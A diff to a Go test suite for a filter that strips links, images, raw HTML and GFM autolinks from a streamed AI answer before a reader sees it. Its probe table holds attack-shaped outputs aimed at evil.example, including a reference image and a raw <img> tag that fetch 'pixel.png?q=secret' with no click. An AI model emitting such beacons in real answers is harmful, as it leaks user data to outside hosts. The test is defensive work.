@@ -2,6 +2,7 @@ package going
 
 import (
 	"errors"
+	"regexp"
 	"strconv"
 	"strings"
 	"testing"
@@ -196,8 +197,10 @@ func escaped(text string) string {
 }
 
 // plainText checks the contract of a text frame over the whole answer: every ASCII punctuation
-// byte a reader is sent stands behind a backslash, so no frame of the stream can become a link,
-// an image, a tag or a code span, and no two frames can meet in one.
+// byte a reader is sent stands behind a backslash, which is what closes markdown's own
+// constructs - no frame of the stream can become a link, an image, a tag or a code span, and no
+// two frames can meet in one. It is not what keeps a literal autolink out, since a renderer
+// decodes the escape before GFM looks for one: noAutolink checks that rule.
 func plainText(t *testing.T, answer string) {
 	t.Helper()
 	for i := 0; i < len(answer); i++ {
@@ -214,10 +217,12 @@ func plainText(t *testing.T, answer string) {
 	}
 }
 
-// beforeLinkify is what a renderer holds before it looks for a link in the text: the character
-// references decoded, and the raw HTML tags taken out of it, so whatever stood on either side of
-// a tag meets. A backslash escape stops both - which is the whole of what the filter rests on -
-// so an escaped byte is copied with its backslash and decodes to nothing.
+// beforeLinkify is what a renderer holds before it reads the text for markdown's own
+// constructs: the character references decoded, and the raw HTML tags taken out of it, so
+// whatever stood on either side of a tag meets. A backslash escape closes a construct and stops
+// a reference, so an escaped byte is copied with its backslash and decodes to nothing. It
+// closes no literal autolink, which a renderer finds in the text the escapes decode to: that is
+// what decoded and noAutolink are for.
 func beforeLinkify(text string) string {
 	var out strings.Builder
 	for i := 0; i < len(text); {
@@ -275,9 +280,50 @@ func offers(text, shape string) bool {
 	return strings.Contains(text, shape) || strings.Contains(beforeLinkify(text), shape)
 }
 
+// autolinkMarks are the marks GFM links a word by with no markdown around it at all, and
+// emailShape the address it links the same way. Both are written out here rather than taken
+// from the filter, so a test is a second opinion on the set and not a copy of one.
+var (
+	autolinkMarks = []string{"www.", "://", "mailto:", "xmpp:"}
+	emailShape    = regexp.MustCompile(`[A-Za-z0-9._+-]+@[A-Za-z0-9_-]+\.[A-Za-z0-9]`)
+)
+
+// decoded is the text a renderer holds once it has decoded the character escapes the server
+// wrote: a backslash and the byte after it are that byte alone. It is the text GFM's autolink
+// extension reads, because remark decodes the escape before the extension looks at it, which is
+// why the escape closes markdown's own constructs and closes none of its literal autolinks.
+func decoded(text string) string {
+	var out strings.Builder
+	for i := 0; i < len(text); i++ {
+		if text[i] == '\\' && i+1 < len(text) {
+			i++
+		}
+		out.WriteByte(text[i])
+	}
+	return out.String()
+}
+
+// noAutolink checks the invariant a renderer reads: the whole answer, decoded as a renderer
+// decodes it, carries no www. host, no scheme's ://, no mailto: or xmpp: and no address, so
+// there is nothing in it for GFM to link with no markdown at all.
+func noAutolink(t *testing.T, answer string) {
+	t.Helper()
+	text := decoded(answer)
+	for _, mark := range autolinkMarks {
+		if at := strings.Index(strings.ToLower(text), mark); at >= 0 {
+			t.Errorf("the answer decodes to %q, which offers a renderer %q at byte %d: GFM links that with no markdown at all",
+				text, mark, at)
+		}
+	}
+	if address := emailShape.FindString(text); address != "" {
+		t.Errorf("the answer decodes to %q, which offers a renderer the address %q: GFM links that with no markdown at all",
+			text, address)
+	}
+}
+
 // TestFilterEmitsWholeWordsAsTheyArrive: a reader is told the words of each delta as that delta
 // arrives, so the answer still streams, and never the half of a word the delta ended in - that
-// word is held until a space, or Close, completes it, which is what lets every token be judged
+// word is held until a space, or Close, completes it, which is what lets every word be judged
 // before a reader sees it.
 func TestFilterEmitsWholeWordsAsTheyArrive(t *testing.T) {
 	deltas := []string{"Dispatch keeps ", "the broadcast or", "der on the issue."}
@@ -412,6 +458,233 @@ func TestFilterKeepsALinkInTheCitationSet(t *testing.T) {
 	}
 }
 
+// linkProbe is one form a renderer makes a link of: what the model wrote, the whole text of
+// every frame the reader gets of it, the bytes a renderer would make the link or the fetch out
+// of, and what the stream says became of it. The forms are declared here, once, because two
+// tests read them - the one that checks each form's own text and counts, and the one that
+// checks the invariant a renderer reads over every answer of the suite at once.
+type linkProbe struct {
+	name    string
+	answer  string
+	want    string
+	linked  string
+	dropped int
+	items   int
+}
+
+var linkProbes = []linkProbe{
+	{
+		name:    "brackets inside the link text",
+		answer:  "Read [[x]](//evil.example) now.",
+		want:    escaped("Read [x] now."),
+		linked:  "](//evil.example)",
+		dropped: 1,
+	},
+	{
+		name:    "balanced brackets around a word of the link text",
+		answer:  "Read [a [b] c](//evil.example) now.",
+		want:    escaped("Read a [b] c now."),
+		linked:  "](//evil.example)",
+		dropped: 1,
+	},
+	{
+		name:    "a newline inside the link text",
+		answer:  "Read [x\ny](//evil.example) now.",
+		want:    escaped("Read [x\ny](//evil.example) now."),
+		linked:  "](//evil.example)",
+		dropped: 0,
+	},
+	{
+		name:    "a code span inside the link text, which binds tighter than the brackets",
+		answer:  "Read [x`](/issues/INFRA-1279)`](//evil.example) now.",
+		want:    escaped("Read [x`](/issues/INFRA-1279)`](//evil.example) now."),
+		linked:  "](//evil.example)",
+		dropped: 0,
+		items:   0,
+	},
+	{
+		name:    "a definition inside a block quote, which gives the whole document a target",
+		answer:  "> [r]: //evil.example\n\nSee [r] for it.",
+		want:    escaped("> [r]: //evil.example\n\nSee [r] for it."),
+		linked:  "[r]: //evil.example",
+		dropped: 0,
+	},
+	{
+		name:    "a www host that does not open the word it stands in",
+		answer:  "Read (www.evil.example) now.",
+		want:    escaped("Read ") + escaped(" now."),
+		linked:  "www.evil.example",
+		dropped: 1,
+	},
+	{
+		name:    "an email address, which GFM links with no markdown at all",
+		answer:  "Mail user@evil.example now.",
+		want:    escaped("Mail ") + escaped(" now."),
+		linked:  "user@evil.example",
+		dropped: 1,
+	},
+	{
+		name:    "a tag whose deletion would join a link out of its neighbours",
+		answer:  "Read [a]<b>(//evil.example) now.",
+		want:    escaped("Read [a](//evil.example) now."),
+		linked:  "](//evil.example)",
+		dropped: 1,
+	},
+	{
+		// The tag stood between the scheme and the host, so the word a reader sees is the
+		// one word https://evil.example: the filter judges that word, drops it whole, and
+		// counts the tag it was built across as a drop of its own.
+		name:    "a tag whose deletion would join a bare URL out of its neighbours",
+		answer:  "Read https:<b>//evil.example now.",
+		want:    escaped("Read ") + escaped(" now."),
+		linked:  "https://",
+		dropped: 2,
+	},
+	{
+		name:    "a character reference that decodes to a www host",
+		answer:  "Read www&#46;evil.example now.",
+		want:    escaped("Read www&#46;evil.example now."),
+		linked:  "www.evil.example",
+		dropped: 0,
+	},
+	{
+		name:    "a bare mailto address",
+		answer:  "Mail mailto:ops@evil.example now.",
+		want:    escaped("Mail ") + escaped(" now."),
+		linked:  "mailto:ops@evil.example",
+		dropped: 1,
+	},
+	{
+		name:    "a bare xmpp address",
+		answer:  "Say xmpp:romeo@montague.net now.",
+		want:    escaped("Say ") + escaped(" now."),
+		linked:  "xmpp:romeo@montague.net",
+		dropped: 1,
+	},
+	{
+		name:    "an inline link to a target the model was never given",
+		answer:  "Read [some other issue](" + outsideHref + ") instead.",
+		want:    escaped("Read some other issue instead."),
+		linked:  "](" + outsideHref + ")",
+		dropped: 1,
+	},
+	{
+		name:    "an inline image, even of an item the model was given",
+		answer:  "Look at ![the chart](/issues/INFRA-1279) now.",
+		want:    escaped("Look at the chart now."),
+		linked:  "](/issues/INFRA-1279)",
+		dropped: 1,
+	},
+	{
+		name:    "a reference link and the definition that gives it its target",
+		answer:  "See [the order][r] for it.\n\n[r]: https://evil.example/x",
+		want:    escaped("See the order for it.\n\n[r]: "),
+		linked:  "https://evil.example/x",
+		dropped: 2,
+	},
+	{
+		name:    "a reference image, which a page fetches with no click",
+		answer:  "![beacon][p]\n\n[p]: https://evil.example/pixel.png?q=secret",
+		want:    escaped("beacon\n\n[p]: "),
+		linked:  "https://evil.example/pixel.png",
+		dropped: 2,
+	},
+	{
+		name:    "a collapsed reference",
+		answer:  "See [the order][] for it.",
+		want:    escaped("See the order for it."),
+		linked:  "[the order][]",
+		dropped: 1,
+	},
+	{
+		name:    "an autolink",
+		answer:  "Read <https://evil.example/x> now.",
+		want:    escaped("Read ") + escaped(" now."),
+		linked:  "<https://evil.example/x>",
+		dropped: 1,
+	},
+	{
+		name:    "an email autolink",
+		answer:  "Mail <ops@evil.example> now.",
+		want:    escaped("Mail ") + escaped(" now."),
+		linked:  "<ops@evil.example>",
+		dropped: 1,
+	},
+	{
+		name:    "a raw HTML image, which a page fetches with no click",
+		answer:  `Read <img src="https://evil.example/pixel.png"> now.`,
+		want:    escaped("Read ") + escaped(" now."),
+		linked:  `<img src="https://evil.example/pixel.png">`,
+		dropped: 1,
+	},
+	{
+		name:    "a raw HTML tag and its closing tag",
+		answer:  "Say <span title=\"x\">it</span> plainly.",
+		want:    escaped("Say ") + escaped("it") + escaped(" plainly."),
+		linked:  `<span title="x">`,
+		dropped: 2,
+	},
+	{
+		name:    "a bare URL, which a renderer links with no markdown at all",
+		answer:  "Read https://evil.example/x now.",
+		want:    escaped("Read ") + escaped(" now."),
+		linked:  "https://evil.example/x",
+		dropped: 1,
+	},
+	{
+		name:    "a bare www host, in the case the model wrote it",
+		answer:  "Read WWW.evil.example/x now.",
+		want:    escaped("Read ") + escaped(" now."),
+		linked:  "WWW.evil.example/x",
+		dropped: 1,
+	},
+	{
+		// The joins: what a reader sees of a word is the word the filter must judge,
+		// however many pieces of the model's text the filter built that word out of.
+		name:    "a tag whose deletion joins a www host out of its neighbours",
+		answer:  "Read www<b>.evil.com now.",
+		want:    escaped("Read ") + escaped(" now."),
+		linked:  "www.evil.com",
+		dropped: 2,
+	},
+	{
+		name:    "a tag whose deletion joins an address out of its neighbours",
+		answer:  "Mail user<b>@evil.com now.",
+		want:    escaped("Mail ") + escaped(" now."),
+		linked:  "user@evil.com",
+		dropped: 2,
+	},
+	{
+		// The model's own bytes carry no www. host; the text the server reduced the link
+		// to, meeting what follows it, does. linked is therefore the piece that text runs
+		// into, and the whole join is what the decoded answer may not carry.
+		name:    "a link the server reduced, whose text joins a www host",
+		answer:  "Read [ww](" + outsideHref + ")w.evil.com now.",
+		want:    escaped("Read ") + escaped(" now."),
+		linked:  "w.evil.com",
+		dropped: 2,
+	},
+	{
+		// The link was cited, so the item frame arrives even though the word was dropped:
+		// it carries that hit's own href, and it is the one honest link such an answer has.
+		name:    "a cited link the server reduced, whose text joins a www host",
+		answer:  "Read [ww](/issues/INFRA-1279)w.evil.com now.",
+		want:    escaped("Read ") + escaped(" now."),
+		linked:  "w.evil.com",
+		dropped: 1,
+		items:   1,
+	},
+	{
+		// GFM leaves the sentence's own full stop out of the link rather than refusing the
+		// link, so a host is judged by its labels and not by the byte it trails off in.
+		name:    "an address the sentence's own full stop follows",
+		answer:  "Write to user@evil.com. Thanks",
+		want:    escaped("Write to ") + escaped(" Thanks"),
+		linked:  "user@evil.com",
+		dropped: 1,
+	},
+}
+
 // TestFilterEmitsNoLinkInATextFrame: every form a renderer makes a link of, reduced to the text
 // a reader sees of it or dropped, counted, and escaped. Each case carries the bytes a renderer
 // needs for the link - linked - and the test checks both sides of the rule: the answer the model
@@ -419,179 +692,7 @@ func TestFilterKeepsALinkInTheCitationSet(t *testing.T) {
 // form at all, decoded references and deleted tags included. Each case is driven at several
 // delta sizes, since a form the model splits over frames is the same form.
 func TestFilterEmitsNoLinkInATextFrame(t *testing.T) {
-	for _, tc := range []struct {
-		name string
-		// answer is what the model wrote, want the whole text of every frame the reader gets,
-		// and linked the bytes a renderer would make the link or the fetch out of.
-		answer  string
-		want    string
-		linked  string
-		dropped int
-		items   int
-	}{
-		{
-			name:    "brackets inside the link text",
-			answer:  "Read [[x]](//evil.example) now.",
-			want:    escaped("Read [x] now."),
-			linked:  "](//evil.example)",
-			dropped: 1,
-		},
-		{
-			name:    "balanced brackets around a word of the link text",
-			answer:  "Read [a [b] c](//evil.example) now.",
-			want:    escaped("Read a [b] c now."),
-			linked:  "](//evil.example)",
-			dropped: 1,
-		},
-		{
-			name:    "a newline inside the link text",
-			answer:  "Read [x\ny](//evil.example) now.",
-			want:    escaped("Read [x\ny](//evil.example) now."),
-			linked:  "](//evil.example)",
-			dropped: 0,
-		},
-		{
-			name:    "a code span inside the link text, which binds tighter than the brackets",
-			answer:  "Read [x`](/issues/INFRA-1279)`](//evil.example) now.",
-			want:    escaped("Read [x`](/issues/INFRA-1279)`](//evil.example) now."),
-			linked:  "](//evil.example)",
-			dropped: 0,
-			items:   0,
-		},
-		{
-			name:    "a definition inside a block quote, which gives the whole document a target",
-			answer:  "> [r]: //evil.example\n\nSee [r] for it.",
-			want:    escaped("> [r]: //evil.example\n\nSee [r] for it."),
-			linked:  "[r]: //evil.example",
-			dropped: 0,
-		},
-		{
-			name:    "a www host that does not open its token",
-			answer:  "Read (www.evil.example) now.",
-			want:    escaped("Read ") + escaped(" now."),
-			linked:  "www.evil.example",
-			dropped: 1,
-		},
-		{
-			name:    "an email address, which GFM links with no markdown at all",
-			answer:  "Mail user@evil.example now.",
-			want:    escaped("Mail ") + escaped(" now."),
-			linked:  "user@evil.example",
-			dropped: 1,
-		},
-		{
-			name:    "a tag whose deletion would join a link out of its neighbours",
-			answer:  "Read [a]<b>(//evil.example) now.",
-			want:    escaped("Read [a](//evil.example) now."),
-			linked:  "](//evil.example)",
-			dropped: 1,
-		},
-		{
-			name:    "a tag whose deletion would join a bare URL out of its neighbours",
-			answer:  "Read https:<b>//evil.example now.",
-			want:    escaped("Read https://evil.example now."),
-			linked:  "https://",
-			dropped: 1,
-		},
-		{
-			name:    "a character reference that decodes to a www host",
-			answer:  "Read www&#46;evil.example now.",
-			want:    escaped("Read www&#46;evil.example now."),
-			linked:  "www.evil.example",
-			dropped: 0,
-		},
-		{
-			name:    "a bare mailto address",
-			answer:  "Mail mailto:ops@evil.example now.",
-			want:    escaped("Mail ") + escaped(" now."),
-			linked:  "mailto:ops@evil.example",
-			dropped: 1,
-		},
-		{
-			name:    "a bare xmpp address",
-			answer:  "Say xmpp:romeo@montague.net now.",
-			want:    escaped("Say ") + escaped(" now."),
-			linked:  "xmpp:romeo@montague.net",
-			dropped: 1,
-		},
-		{
-			name:    "an inline link to a target the model was never given",
-			answer:  "Read [some other issue](" + outsideHref + ") instead.",
-			want:    escaped("Read some other issue instead."),
-			linked:  "](" + outsideHref + ")",
-			dropped: 1,
-		},
-		{
-			name:    "an inline image, even of an item the model was given",
-			answer:  "Look at ![the chart](/issues/INFRA-1279) now.",
-			want:    escaped("Look at the chart now."),
-			linked:  "](/issues/INFRA-1279)",
-			dropped: 1,
-		},
-		{
-			name:    "a reference link and the definition that gives it its target",
-			answer:  "See [the order][r] for it.\n\n[r]: https://evil.example/x",
-			want:    escaped("See the order for it.\n\n[r]: "),
-			linked:  "https://evil.example/x",
-			dropped: 2,
-		},
-		{
-			name:    "a reference image, which a page fetches with no click",
-			answer:  "![beacon][p]\n\n[p]: https://evil.example/pixel.png?q=secret",
-			want:    escaped("beacon\n\n[p]: "),
-			linked:  "https://evil.example/pixel.png",
-			dropped: 2,
-		},
-		{
-			name:    "a collapsed reference",
-			answer:  "See [the order][] for it.",
-			want:    escaped("See the order for it."),
-			linked:  "[the order][]",
-			dropped: 1,
-		},
-		{
-			name:    "an autolink",
-			answer:  "Read <https://evil.example/x> now.",
-			want:    escaped("Read ") + escaped(" now."),
-			linked:  "<https://evil.example/x>",
-			dropped: 1,
-		},
-		{
-			name:    "an email autolink",
-			answer:  "Mail <ops@evil.example> now.",
-			want:    escaped("Mail ") + escaped(" now."),
-			linked:  "<ops@evil.example>",
-			dropped: 1,
-		},
-		{
-			name:    "a raw HTML image, which a page fetches with no click",
-			answer:  `Read <img src="https://evil.example/pixel.png"> now.`,
-			want:    escaped("Read ") + escaped(" now."),
-			linked:  `<img src="https://evil.example/pixel.png">`,
-			dropped: 1,
-		},
-		{
-			name:    "a raw HTML tag and its closing tag",
-			answer:  "Say <span title=\"x\">it</span> plainly.",
-			want:    escaped("Say ") + escaped("it") + escaped(" plainly."),
-			linked:  `<span title="x">`,
-			dropped: 2,
-		},
-		{
-			name:    "a bare URL, which a renderer links with no markdown at all",
-			answer:  "Read https://evil.example/x now.",
-			want:    escaped("Read ") + escaped(" now."),
-			linked:  "https://evil.example/x",
-			dropped: 1,
-		},
-		{
-			name:    "a bare www host, in the case the model wrote it",
-			answer:  "Read WWW.evil.example/x now.",
-			want:    escaped("Read ") + escaped(" now."),
-			linked:  "WWW.evil.example/x",
-			dropped: 1,
-		},
-	} {
+	for _, tc := range linkProbes {
 		t.Run(tc.name, func(t *testing.T) {
 			// The control: the form the model wrote really does offer a renderer the bytes of
 			// the link, so what the rule below asserts is the rule's own doing.
@@ -621,23 +722,27 @@ func TestFilterEmitsNoLinkInATextFrame(t *testing.T) {
 	}
 }
 
+// plainProbes are the shapes that are not links: a bracket no reference or definition follows,
+// a < that opens no tag, a host with no scheme. They are declared here, once, for the test that
+// keeps each rule above honest and for the one that reads the whole suite's invariant.
+var plainProbes = []string{
+	"The order is [not a link] here.",
+	"The order is [not a link][ here.",
+	"See [the order] for it, and [the order] again.",
+	"Mind the ! and the [order] alike.",
+	"The count is 3 < 5 and 7 > 2 here.",
+	"It costs <3 of the budget.",
+	"Read evil.example/x for it.",
+	"Read www for it.",
+	"The label order: is settled.",
+	"Mind the <3 and the [brackets] alike.",
+}
+
 // TestFilterKeepsTextThatOnlyLooksLikeALink: the control for every form above. The same shapes
-// that are not links - a bracket no reference or definition follows, a < that opens no tag, a
-// host with no scheme - are the answer's own words, and a reader is given every one of them,
+// that are not links are the answer's own words, and a reader is given every one of them,
 // escaped as plain text, so each rule above drops a link and not the prose around it.
 func TestFilterKeepsTextThatOnlyLooksLikeALink(t *testing.T) {
-	for _, answer := range []string{
-		"The order is [not a link] here.",
-		"The order is [not a link][ here.",
-		"See [the order] for it, and [the order] again.",
-		"Mind the ! and the [order] alike.",
-		"The count is 3 < 5 and 7 > 2 here.",
-		"It costs <3 of the budget.",
-		"Read evil.example/x for it.",
-		"Read www for it.",
-		"The label order: is settled.",
-		"Mind the <3 and the [brackets] alike.",
-	} {
+	for _, answer := range plainProbes {
 		t.Run(answer, func(t *testing.T) {
 			for _, size := range []int{1, 4, 1000} {
 				emitted := drive(t, citationsOf(citedIssue), pieces(answer, size)...)
@@ -652,9 +757,30 @@ func TestFilterKeepsTextThatOnlyLooksLikeALink(t *testing.T) {
 	}
 }
 
+// TestFilterOffersARendererNoAutolink: the invariant a renderer reads, over every probe of the
+// suite at once. A character escape closes markdown's own constructs - a link, an image, a raw
+// tag, a code span, a definition - but a renderer decodes it before GFM's autolink extension
+// reads the text, so what that extension is given is the decoded answer, and the decoded answer
+// of every probe may carry no www. host, no scheme's ://, no mailto: or xmpp: and no address.
+func TestFilterOffersARendererNoAutolink(t *testing.T) {
+	answers := make([]string, 0, len(linkProbes)+len(plainProbes))
+	for _, probe := range linkProbes {
+		answers = append(answers, probe.answer)
+	}
+	answers = append(answers, plainProbes...)
+	for _, answer := range answers {
+		t.Run(answer, func(t *testing.T) {
+			for _, size := range []int{1, 4, 1000} {
+				emitted := drive(t, citationsOf(citedIssue, citedComment), pieces(answer, size)...)
+				noAutolink(t, emitted.text())
+			}
+		})
+	}
+}
+
 // TestFilterSaysNoneOnlyWhenTheModelWroteNothing: none says the model produced no answer text at
 // all - a run that spent its calls and wrote nothing - and says nothing about what became of
-// that text. An answer the server reduced or dropped every token of is still an answer the model
+// that text. An answer the server reduced or dropped every word of is still an answer the model
 // wrote: changed says what the server did, and end's items of 0 says it rests on no source.
 func TestFilterSaysNoneOnlyWhenTheModelWroteNothing(t *testing.T) {
 	for _, tc := range []struct {
@@ -688,7 +814,7 @@ func TestFilterSaysNoneOnlyWhenTheModelWroteNothing(t *testing.T) {
 			tail:   []string{contracts.GoingEventChanged, contracts.GoingEventEnd},
 		},
 		{
-			name:   "an answer the server dropped every token of is still text the model wrote",
+			name:   "an answer the server dropped every word of is still text the model wrote",
 			deltas: []string{"https://evil.example/x"},
 			tail:   []string{contracts.GoingEventChanged, contracts.GoingEventEnd},
 		},
@@ -777,20 +903,25 @@ func TestFilterHoldsALinkSpanSplitAcrossDeltas(t *testing.T) {
 	}
 }
 
-// TestFilterBoundsTheTextItHolds: a token with no space after it, and a [ the model never
-// closed, are held only to heldByteMax, where each is decided as it stands and emitted. A reader
-// is never left waiting on text the model has already written, no delta re-scans more than the
-// bound, and the text that comes out is as plain as any other: a token the bound cut in half can
-// no more become a link than a whole one can, because every byte of both is escaped.
+// TestFilterBoundsTheTextItHolds: a word with no whitespace after it, and a [ the model never
+// closed, are each held to a bound of their own - the word to heldWordMax, the span to
+// heldByteMax - so no delta re-scans without end and a reader is never left waiting on text the
+// model has already written. The two bounds end differently, and must: the span is decided as
+// the ordinary text it turned out to be, while the word is dropped whole, because the escape is
+// no answer to a literal autolink and the half of a word a bound kept would be a link to a
+// renderer wherever GFM would link that half. The rest of the word is dropped with it and
+// counted once, and the words after it still reach the reader.
 func TestFilterBoundsTheTextItHolds(t *testing.T) {
+	const tail = " and the rest of it."
 	for _, tc := range []struct {
-		name  string
-		delta string
-		want  string
+		name    string
+		delta   string
+		want    string
+		dropped int
 	}{
-		{"a token with no space in it", strings.Repeat("a", 200_001), strings.Repeat("a", 200_001)},
-		{"a bracket the model never closed", "[" + strings.Repeat("a", 200_001), escaped("[") + strings.Repeat("a", 200_001)},
-		{"a scheme the bound falls inside of", "https" + strings.Repeat("a", 200_001) + "://evil.example", ""},
+		{"a word longer than the bound", strings.Repeat("a", 200_001) + tail, escaped(tail), 1},
+		{"a bracket the model never closed", "[" + strings.Repeat("a", 200_001) + tail, escaped(tail), 1},
+		{"a scheme the bound falls inside of", "https" + strings.Repeat("a", 200_001) + "://evil.example" + tail, escaped(tail), 1},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			emitted := &stream{}
@@ -800,7 +931,15 @@ func TestFilterBoundsTheTextItHolds(t *testing.T) {
 					t.Fatalf("Write(%d): %v", i, err)
 				}
 				if held := len(filter.pending); held >= heldByteMax {
-					t.Fatalf("after delta %d the filter holds %d bytes, want fewer than the bound of %d", i, held, heldByteMax)
+					t.Fatalf("after delta %d the filter holds %d undecided bytes, want fewer than the bound of %d", i, held, heldByteMax)
+				}
+				if held := len(filter.word); held >= heldWordMax {
+					t.Fatalf("after delta %d the filter holds a word of %d bytes, want fewer than the bound of %d", i, held, heldWordMax)
+				}
+				if held := emitted.text(); !strings.HasPrefix(tc.want, held) {
+					// Half of the word the bound cut would be here, and a renderer links a
+					// half as readily as a whole.
+					t.Fatalf("after delta %d the reader has seen %q, want a start of %q", i, held[:min(len(held), 40)], tc.want)
 				}
 			}
 			if len(emitted.events) == 0 {
@@ -811,14 +950,14 @@ func TestFilterBoundsTheTextItHolds(t *testing.T) {
 			}
 			got := emitted.text()
 			plainText(t, got)
-			if tc.want != "" && got != tc.want {
-				t.Errorf("answer is %d bytes, want the %d bytes of %q...", len(got), len(tc.want), tc.want[:min(len(tc.want), 20)])
+			if got != tc.want {
+				t.Errorf("answer = %q, want %q", got, tc.want)
 			}
-			// The bound decides a token the model never ended, so the halves of one scheme can
-			// reach a reader; escaped, they are text and not the link the whole token was.
-			if offers(got, "://") {
-				t.Errorf("the answer offers a renderer %q, which it may offer in no form", "://")
+			if dropped := emitted.dropped(t); dropped != tc.dropped {
+				t.Errorf("changed dropped = %d, want %d: the word the bound cut is one drop, and the rest of it is none",
+					dropped, tc.dropped)
 			}
+			noAutolink(t, got)
 			emitted.terminal(t)
 		})
 	}
